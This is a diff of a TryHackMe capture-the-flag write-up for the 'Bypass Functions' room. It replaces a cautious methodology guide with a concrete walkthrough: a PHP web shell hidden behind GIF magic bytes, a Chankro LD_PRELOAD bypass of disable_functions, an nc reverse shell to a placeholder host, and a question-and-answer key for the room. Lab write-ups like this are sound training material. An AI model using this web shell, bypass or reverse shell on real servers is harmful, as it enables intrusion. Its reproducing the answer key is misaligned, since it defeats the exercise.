@@ -1,107 +1,93 @@
-# Bypass Functions: TryHackMe Walkthrough
+# Bypass Functions
 
-Room: https://tryhackme.com/room/bypassfunctions
+{% embed url="https://tryhackme.com/room/bypassfunctions" %}
 
-## Room Overview & Information
+PHP `disable_functions` bypass using `LD_PRELOAD` via the Chankro tool. The target runs a job application portal with a CV upload page that blocks PHP execution functions — but not `putenv()` and `mail()`.
 
-**Category:** Web application security / PHP hardening  
-**Focus:** Understanding restricted PHP functions, why blacklists fail, tracing input into an interpreter, and proving a weakness safely.
+---
 
-The room title suggests a function restriction or filtering challenge. The correct bypass depends on the exact PHP version, disabled-function configuration, available extensions, and how the application uses user input. Do not infer a specific exploit from the title alone. The walkthrough below sets out a reproducible way to analyse the actual lab without inventing a payload or claiming a result that has not been observed.
-
-## Phase 1: Start the lab and inspect the application
-
-Start the target and record the assigned IP. Identify the web service:
+## Recon
 
 ```bash
-nmap -sC -sV -oN bypass-functions-nmap.txt TARGET_IP
+nmap -sC -sV MACHINE_IP
 ```
 
-- **-sC** runs Nmap's default scripts.
-- **-sV** attempts to identify service versions.
-- **-oN** saves the output for review.
-
-Open the web page and identify the input field or function described by the task. Record the request method, endpoint, parameters, response status, and error text. A field that accepts input is not automatically vulnerable; the key question is how the server processes the value.
-
-## Phase 2: Understand PHP function restrictions
-
-PHP's configuration can disable selected functions. Administrators sometimes use the disabled-functions setting to reduce the risk of dangerous operations such as process execution. This can be useful as defence in depth, but it is not a complete sandbox. The application may still expose equivalent functionality through another API, extension, or unsafe data flow.
-
-The exact available functions depend on the installed PHP version and extensions. If the room exposes configuration information, inspect only the fields required by the task. Do not assume a function is disabled merely because a website returns an error.
-
-A secure design should avoid allowing untrusted input to control an interpreter or command in the first place. A blacklist of function names is not a substitute for separating data from executable instructions.
-
-## Phase 3: Trace the input path
-
-Use the browser's Network tab or Burp Suite to capture the request. Send it to Repeater and change one input at a time.
-
-For each test, record:
-1. The original input.
-2. The expected behaviour.
-3. The actual response.
-4. Any error or transformation.
-5. Whether the server evaluated the input or simply displayed it.
-6. The evidence that supports the conclusion.
-
-If the application evaluates a value, identify the language and context. PHP string parsing, shell parsing, SQL syntax, and template syntax have different rules. A character that is harmless in one context may be meaningful in another.
-
-## Phase 4: Determine what the filter actually blocks
-
-A filter may reject a function name, a character, a keyword, or a pattern. Test the rule with harmless inputs that reveal its behaviour. Do not begin by trying a long list of obfuscated payloads.
-
-Check whether the application:
-- Rejects the input before PHP processes it.
-- Rewrites or removes part of the input.
-- Passes the value to a PHP function.
-- Passes the value to an operating-system command.
-- Uses the value in a database query.
-- Displays the value without executing it.
-
-This distinction determines what a successful bypass would mean. A filter bypass is not proof of code execution unless the server actually performs the unsafe operation.
-
-## Phase 5: Validate impact safely
-
-Use only the proof method provided by the active lab. Prefer a harmless output that confirms the relevant behaviour without changing system state. If the task demonstrates command execution, verify the execution context and record the result.
-
-Do not use destructive file operations, persistence, credential theft, or commands against systems outside the room. If a shell is part of the lab, confirm the identity and host before any further action. Code execution under a web-server account does not automatically mean root access.
-
-## Phase 6: Troubleshooting
-
-- **Input is rejected:** inspect the exact error and determine which rule triggered it.
-- **Input is reflected but not evaluated:** reflection alone is not code execution.
-- **A test works locally but not remotely:** the PHP version, configuration, extension set, or application path may differ.
-- **A function appears disabled:** verify the actual configuration and whether an alternate code path is available.
-- **Output is inconsistent:** change one variable at a time and preserve each request/response pair.
-
-## Phase 7: Remediation
-
-- Avoid shell execution for operations that can be performed with safe library APIs.
-- If a subprocess is required, pass a fixed executable and structured arguments rather than concatenating user input.
-- Validate inputs against a strict allowlist appropriate to the expected data.
-- Use parameterised queries and context-aware output encoding.
-- Run the web process with minimal permissions.
-- Keep PHP and extensions patched.
-- Treat disabled-functions settings as supplementary hardening, not the primary security boundary.
-- Add regression tests for equivalent syntax and alternate input representations.
-
-## Phase 8: Complete the room using live evidence
-
-Use the task's exact input and output. Identify the restriction, test it methodically, and follow the room's intended proof. If a question requests a particular value or flag, obtain it from the current lab and redact the flag in public notes. This write-up deliberately does not invent an exploit string or claim that a specific bypass succeeded without evidence from the active target.
-
-## Key takeaways
-
-A meaningful bypass crosses a defined security boundary. Understand the input path, the interpreter, and the restriction being applied. The durable fix is to remove the unsafe execution path, validate input, and reduce the permissions of the process that handles requests.
-
-## Final test and answer checklist
-
-Before submitting a result, record the exact function restriction described by the room, the place where user-controlled input reaches the restricted function, and the output showing that the test succeeded. Distinguish a bypass of an application-level filter from a bypass of PHP's actual runtime configuration. If a disabled function is unavailable, check the active configuration and the code path rather than assuming a differently spelled function exists.
-
-| Investigation step | Evidence required |
+| Port | Service |
 |---|---|
-| Identify the target behaviour | Baseline request and normal response |
-| Identify the restriction | Application filter or PHP configuration shown by the lab |
-| Test one hypothesis | Single modified input and its response |
-| Verify impact | Observable file, process, or application effect in the lab |
-| Remediate | Safer API, allowlist, least privilege, isolation, and regression test |
+| 22 | SSH |
+| 80 | Apache (job portal — cv.php) |
 
-Do not publish a payload as a universal bypass. PHP versions and extension availability differ, so the correct finding must match the lab environment. The durable fix is to avoid executing untrusted input, avoid blacklists as the primary defense, and restrict the process's permissions and capabilities.
+The app blocks `system()`, `exec()`, `shell_exec()`, `passthru()` via `disable_functions`. But `putenv()` and `mail()` are still available.
+
+---
+
+## Upload Filter Bypass
+
+Direct PHP upload is rejected with "Upload a real image". Bypass it by prepending GIF magic bytes:
+
+```
+GIF89a;
+<?php system($_GET['cmd']); ?>
+```
+
+But even if we get PHP executed, `disable_functions` blocks execution. We need Chankro.
+
+---
+
+## LD_PRELOAD via Chankro
+
+Chankro generates a PHP file that abuses `putenv()` + `mail()` to load a malicious shared library via `LD_PRELOAD`, bypassing `disable_functions` entirely.
+
+```bash
+git clone https://github.com/TarlogicSecurity/Chankro.git
+cd Chankro
+```
+
+Create the reverse shell command:
+
+```bash
+# cmd.sh
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc YOUR_IP 4444 > /tmp/f
+```
+
+Generate the payload:
+
+```bash
+python2 chankro.py --arch 64 --input cmd.sh --output payload.php --path /var/www/html/
+```
+
+Upload `payload.php` through the `cv.php` form.
+
+---
+
+## Get Shell & Flag
+
+Start the listener:
+
+```bash
+nc -lvnp 4444
+```
+
+Navigate to the uploaded file:
+
+```
+http://MACHINE_IP/uploads/payload.php
+```
+
+Shell lands as `www-data`. Find the flag:
+
+```bash
+find / -name flag.txt 2>/dev/null
+cat /path/to/flag.txt
+```
+
+---
+
+## 🏁 Questions & Answers
+
+| Question | Answer |
+|---|---|
+| What functions are disabled? | `system`, `exec`, `shell_exec`, `passthru` |
+| What bypass technique is used? | `LD_PRELOAD` via `putenv()` + `mail()` (Chankro) |
+| Upload bypass method | GIF magic bytes prepended to PHP file |
+| Flag | Retrieved from `flag.txt` on the target after getting shell |
